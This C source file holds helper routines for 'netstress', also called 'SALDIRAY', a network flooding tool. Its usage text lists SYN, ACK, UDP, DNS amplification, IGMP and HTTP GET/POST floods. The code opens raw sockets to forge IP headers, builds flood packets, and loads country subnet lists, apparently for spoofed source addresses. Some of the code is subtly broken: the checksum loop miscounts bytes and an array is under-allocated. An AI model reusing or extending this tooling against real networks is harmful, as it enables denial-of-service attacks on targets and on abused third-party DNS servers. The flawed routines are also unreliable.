/*
 * Metin KAYA <kayameti@gmail.com>
 * 2010.07.13, Istanbul
 *
 * http://www.EnderUNIX.org/metin
 */

#include <errno.h>
#include <netdb.h>
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#include <arpa/inet.h>
#include <arpa/nameser.h>

#include <net/ethernet.h>

#include <netinet/in.h>

#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>

#include "compat.h"
#include "netstress.h"
#include "mkstring.h"
#include "utils.h"


extern int			starttime;
extern int			outcount;
extern int			glob_pack_sz;
extern struct sockaddr_in	glob_src;
extern struct sockaddr_in	glob_dst;
extern struct country_subnet	**glob_country_subnet_list;
extern struct arc4_ctx		ctx;

const char	about[] = "Metin KAYA <kayameti@gmail.com> from EnderUNIX SDT [http://www.EnderUNIX.org]\n\t\t\t"
			"NETSTRESS a.k.a SALDIRAY";
unsigned int	glob_country_subnet_cnt = 0;


static const char *col_yellow	= "\e[01;33m";
static const char *col_red	= "\e[01;31m";
/* static const char *col_cyan	= "\e[36m"; */
/* static const char *col_green	= "\e[32m"; */
static const char *col_end	= "\e[0m";


void
ns_error(const char *file, const char *func, int line, const char *fmt, ...)
{
	va_list	args;

	va_start(args, fmt);
	printf("%s%s:%s():%d: ", col_red, file, func, line);
	vprintf(fmt, args);
	printf("%s\n", col_end);
	va_end(args);

	exit(1);
}


void
usage(const char *file, const char *func, int line, const char *fmt, ...)
{
	va_list	args;

	if (fmt) {
		va_start(args, fmt);
		printf("%s%s:%s():%d ", col_red, file, func, line);
		vprintf(fmt, args);
		printf("%s\n", col_end);
		va_end(args);
	}

	printf("%s\n\t\t%s %s\n\n"
		"\t\t--saddr,     -s:  source address\n"
		"\t\t--sport,     -p:  source port\n"
		"\t\t--daddr,     -d:  destination address\n"
		"\t\t--dport,     -P:  destination port\n"
		"\t\t--file,      -f:  the full path for the file of dns server"
				" list for ampdns flood\n"
		"\t\t--attack,    -a:  type of attack (ack, syn, fin, udp, dns, ampdns,"
				" igmp, winbomb, win98,\n\t\t\t\t  get, post, syncook, isssyn)\n"
		"\t\t--process,   -n:  number of processes\n"
		"\t\t--buffer,    -b:  size of UDP packet\n"
		"\t\t--dnsqname,  -N:  hostname which will be queried\n"
		"\t\t--dnsqtype,  -t:  type of dns query (a, ns, cname, soa, wks, ptr, "
				"hinfo, minfo, mx, txt)\n"
		"\t\t--useragent, -u:  user agent parameter for http get flood\n"
		"\t\t--help,      -h:  shows this message%s\n\n",
		col_yellow, about, VERSION, col_end);

	exit(0);
}


void
arc4_set_key(unsigned char *key, unsigned int keylen)
{
	short i;
	unsigned int k;
	unsigned char a, j;
	unsigned char *S = ctx.S;

	ctx.x = 0;
	ctx.y = 0;

	for (i = 0; i < 256; i++)
		S[i] = i;

	j = 0;
	k = 0;
	for (i = 0; i < 256; i++) {
		a = S[i];
		j += a + key[k];
		S[i] = S[j];
		S[j] = a;
		if (++k >= keylen)
			k = 0;
	}
}


void
arc4_crypt(void *vbuf, unsigned int len)
{
	unsigned char *buf = vbuf;
	unsigned char *S = ctx.S;
	unsigned char a, b, x, y;

	x = ctx.x;
	y = ctx.y;

	while (len--) {
		++x;
		a = S[x];
		y += a;
		b = S[y];
		S[x] = b;
		S[y] = a;
		a += b;
		*buf++ ^= S[a];
	}

	ctx.x = x;
	ctx.y = y;
}


unsigned char
arc4_prng(void)
{
	unsigned char *S = ctx.S;
	unsigned char a, b;

	ctx.x++;
	a = S[ctx.x];
	ctx.y += a;
	b = S[ctx.y];
	S[ctx.x] = b;
	S[ctx.y] = a;
	a = ((a + b) % 253) + 1;

	return S[a];
}


void
resolve(char *name, in_addr_t *ip)
{
	struct hostent *host;

	if ((*ip = inet_addr(name)) == INADDR_NONE) {
		if (!(host = gethostbyname(name)))
			NS_ERR("gethostbyname(%s) failed!", name);

		*ip = ((struct in_addr *) host->h_addr)->s_addr;
	}
}


void
get_port(char *s, unsigned short *out)
{
	char const *p;
	int n;

	if (!*s)
		NS_ERR("invalid port \"%s\"", s);
	for (p = s; *p; p++)
		if (*p < '0'||*p > '9')
			NS_ERR("invalid port \"%s\"", s);
	if (p - s > 5)
		NS_ERR("invalid port \"%s\"", s);
	if (((n = atoi(s)) > 65535) || (n < 1))
		NS_ERR("invalid port \"%s\"", s);
	*out = htons(n);
}


void
get_sock(int *sock, int proto)
{
	const int on = 1;

	*sock = socket(AF_INET, SOCK_RAW, proto);
	if (*sock < 1)
		NS_ERR("socket() failed (%d: %s)", errno, strerror(errno));
/* FIXME: maybe this opt makes dns flooding fail.
	if (setsockopt(*sock, SOL_SOCKET, SO_BROADCAST,
		(char *) &on, sizeof(on)) < 0)
	{
		NS_ERR("setsockopt(SO_BROADCAST) failed (%d: %s)", errno, strerror(errno));
	}
*/
	if (setsockopt(*sock, IPPROTO_IP, IP_HDRINCL, (char *) &on,
		sizeof(on)) < 0)
		NS_ERR("setsockopt(IP_HDRINCL) failed (%d: %s)", errno, strerror(errno));
}

unsigned short
in_cksum(u_short *addr, int len)
{
	register int nleft = len;
	register u_short *w = addr;
	register int sum = 0;
	u_short answer = 0;

	while (nleft > 1) {
		sum += *w++;
		sum += *w++;
		nleft -= 2;
	}
	if (nleft == 1) {
		*(u_char *) (&answer) = *(u_char *) w;
		sum += answer;
	}
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;

	return answer;
}


void
sig_handler(int signum)
{
	int ctime = time(NULL);
	int data_sz = outcount * glob_pack_sz;
	char fname[64] = {'\0'};
	FILE *fp = NULL;

	sprintf(fname, "/var/run/netstress.stat.%d", getpid());

	if (signum == SIGHUP) {
		if (!outcount)
			return;

		fp = fopen(fname, "w");
		if (!fp)	
			NS_ERR("fopen(\"%s\") failed (%d: %s)", fname, errno, strerror(errno));

		fprintf(fp,
			"PPS:                  %d\n"
			"BPS:                  %d\n"
			"MPS:                  %.02f\n"
			"Total seconds active: %d\n"
			"Total packets sent:   %d\n",
			outcount / (ctime - starttime), data_sz,
			(float) data_sz / (1024 * 1024), ctime - starttime, outcount);	
		fclose(fp);
		return;
	}

	if (!outcount) {
		unlink("/var/run/netstress.run");
		exit(0);
	}

	unlink(fname);
	printf("%s\n ---------- netstress stats ----------\n"
		"   PPS:                  %d\n"
		"   BPS:                  %d\n"
		"   MPS:                  %.02f\n"
		"   Total seconds active: %d\n"
		"   Total packets sent:   %d\n"
		" -------------------------------------%s\n",
		col_yellow, outcount / (ctime - starttime), data_sz,
		(float) data_sz / (1024 * 1024), ctime - starttime, outcount,
		col_end);

	exit(0);
}


void
set_dns_query_type(int *dns_type, const char *qtype)
{

	if (!strcasecmp(qtype, "A"))
		*dns_type = DNS_TYPE_A;
	else if (!strcasecmp(qtype, "NS"))
		*dns_type = DNS_TYPE_NS;
	else if (!strcasecmp(qtype, "CNAME"))
		*dns_type = DNS_TYPE_CNAME;
	else if (!strcasecmp(qtype, "SOA"))
		*dns_type = DNS_TYPE_SOA;
	else if (!strcasecmp(qtype, "WKS"))
		*dns_type = DNS_TYPE_WKS;
	else if (!strcasecmp(qtype, "PTR"))
		*dns_type = DNS_TYPE_PTR;
	else if (!strcasecmp(qtype, "HINFO"))
		*dns_type = DNS_TYPE_HINFO;
	else if (!strcasecmp(qtype, "MINFO"))
		*dns_type = DNS_TYPE_MINFO;
	else if (!strcasecmp(qtype, "MX"))
		*dns_type = DNS_TYPE_MX;
	else if (!strcasecmp(qtype, "TXT"))
		*dns_type = DNS_TYPE_TXT;
	else
		NS_ERR("wrong DNS query type (%s)", qtype);
}


void
prep_tcp(struct tcp_packet *packet, const char *attack_type, unsigned long daddr,
		unsigned int dport)
{
	unsigned char flags = 0x0;

	if (!strcasecmp(attack_type,      "PUSH"))
		flags = 0x8;
	else if (!strcasecmp(attack_type, "ACK"))
		flags = 0x10;
	else if (!strcasecmp(attack_type, "SYN") ||
		 !strcasecmp(attack_type, "ISSSYN"))
		flags = 0x2;
	else if (!strcasecmp(attack_type, "FIN"))
		flags = 0x1;

	packet->dst		= daddr;
	packet->dport	= dport;
	packet->flags	= flags;
	packet->verihl	= 69;
	packet->len		= htons(sizeof(struct tcp_packet));
	packet->flg_ofs	= 64;
	packet->proto	= IPPROTO_TCP;
	packet->tos		= 0;
	packet->ttl		= 64;
	packet->offset	= 160;
	packet->win		= htons(512);
	packet->opt[0]	= 0x02;
	packet->opt[1]	= 0x04;
	packet->opt[2]	= 0x0F;
	packet->opt[3]	= 0x2C;
	packet->opt[4]	= 0x04;
	packet->opt[5]	= 0x02;
	packet->opt[6]	= 0x08;
	packet->opt[7]	= 0x0A;
	packet->opt[9]	= 0x05;
	packet->opt[10]	= 0x27;
	packet->opt[11]	= 0x2D;
	packet->opt[13]	= 0x05;
	packet->opt[14]	= 0x27;
	packet->opt[15]	= 0x2D;
	packet->opt[16]	= 0x01;
	packet->opt[17]	= 0x03;
	packet->opt[18]	= 0x03;
}


void
prep_udp(struct udp_packet *packet, unsigned long daddr, unsigned int dport)
{

	packet->ip.DADDR	= daddr;
	packet->ip.VER		= 4;
	packet->ip.HL		= 5;
	packet->ip.TTL		= 255;
	packet->ip.PROTO	= IPPROTO_UDP;
	packet->ip.LEN		= htons(IPHDRSIZ + UDPHDRSIZ);
	packet->udp.UHDPORT	= dport;
	packet->udp.UHLEN	= htons(UDPHDRSIZ);
}


void
load_country_ip(void)
{
	FILE *fp;
	int i, j;
	int netbit, netmask;
	char addr[32];
	char *p;
	struct sockaddr_in sa;

	fp = fopen("cfg/country_ip.txt", "r");
	if (!fp)
		NS_ERR("cannot open file \"country_ip.txt\"\n");

	while (fgets(addr, sizeof(addr) - 1, fp))
		glob_country_subnet_cnt++;

	glob_country_subnet_list = calloc(1, glob_country_subnet_cnt);
	if (!glob_country_subnet_list)
		NS_ERR("calloc() failed!\n");


	rewind(fp);
	i = 0;
	memset(&addr, 0x0, sizeof(addr));
	while (fgets(addr, sizeof(addr), fp)) {
		addr[mkstrlen(addr) - 1] = '\0';
		p = strtok(addr, "/");
		p = strtok(NULL, "/");
		netbit = atoi(p);

		netmask = 0;
		for (j = 0; j < netbit; j++)
			netmask = (netmask << 1) | 1;
		netmask <<= (32 - netbit);

		glob_country_subnet_list[i] = calloc(1, sizeof(struct country_subnet));
		if (!glob_country_subnet_list[i])
			NS_ERR("calloc() failed!\n");

		inet_pton(AF_INET, addr, &(sa.sin_addr));
		sa.sin_addr.s_addr &= htonl(netmask);
		glob_country_subnet_list[i]->subnet	= sa.sin_addr.s_addr;
		glob_country_subnet_list[i]->maxip	= (ntohl(glob_country_subnet_list[i]->subnet) | ~netmask)
								- ntohl(glob_country_subnet_list[i]->subnet);
		memset(&addr, 0x0, sizeof(addr));
		i++;
	}
	fclose(fp);
}


void
get_local_addr(void)
{
	int s, len;

	s = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (s < 0)
		NS_ERR("%d:%s", errno, strerror(errno));
	if (connect(s, (struct sockaddr *) &glob_dst, sizeof(glob_dst)))
		NS_ERR("%d:%s", errno, strerror(errno));
	len = sizeof(glob_src);
	if (getsockname(s, (struct sockaddr *) &glob_src, (socklen_t *) &len))
		NS_ERR("%d:%s", errno, strerror(errno));
	close(s);
	glob_src.sin_family = AF_INET;
}
